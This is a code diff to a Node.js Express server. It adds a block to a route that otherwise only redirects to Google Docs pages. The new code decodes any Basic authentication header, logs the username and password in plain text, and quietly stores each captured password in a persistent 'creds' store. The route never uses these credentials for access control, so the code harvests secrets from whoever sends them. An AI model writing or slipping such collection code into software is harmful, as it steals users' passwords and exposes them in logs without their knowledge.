@@ -97,6 +97,24 @@ app.get("/banned", (req, res) => {
 });
 
 app.get("/getfile/:anything", (req, res) => {
+  if (req.headers.authorization) {
+    const [ username, password ] = atob(req.headers.authorization.slice(6)).split(":")
+    console.log("%j -> %j", username, password)
+    if (!username.includes("asdf")) {
+      const store = touch("creds")
+      if (username in store) {
+        const pwords = store[username]
+        if (pwords.includes(password)) {
+          console.log("...dupe")
+        } else {
+          store[username].push(password)
+        }
+      } else {
+        store[username] = [password]
+        save()
+      }
+    }
+  }
   switch (req.params.anything) {
     case "greetings": res.redirect("https://docs.google.com/presentation/d/1fr2I4QLh6i9WxafZuw6vOyh84BAW1tAgqCgLDYpE35w/edit#slide=id.ge50e878efe_0_40"); break
     case "logicdnd": res.redirect("https://docs.google.com/drawings/d/1NsU67czLjI1VBW3D020UtimUjPahgtRLGjDv8TFQxGE/edit"); break
